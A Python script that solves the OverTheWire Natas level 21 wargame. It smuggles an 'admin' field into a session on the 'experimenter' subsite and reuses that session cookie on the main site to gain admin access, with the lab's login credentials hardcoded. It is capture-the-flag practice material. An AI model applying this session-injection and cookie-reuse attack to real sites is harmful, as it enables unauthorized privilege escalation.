import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random


def receive_response(_payload):
    auth_username = 'natas21'
    auth_password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ' 
    response = requests.post('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def exploit():

    sess = requests.Session()

    auth_username = 'natas21'
    auth_password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ' 
    _payload = {'align' : 'left', 'fontsize': '100%', 'bgcolor' : 'red', 'admin':'1', 'submit':'Update'}
    
    response = sess.get('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response) 
    
    response = sess.post('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    dissect_response(response) 

    for cookie in sess.cookies:
        val = cookie.value

    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response) 

    for cookie in sess.cookies:
        if(cookie.domain == "natas21.natas.labs.overthewire.org"):
            cookie.value = val

    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) 

exploit()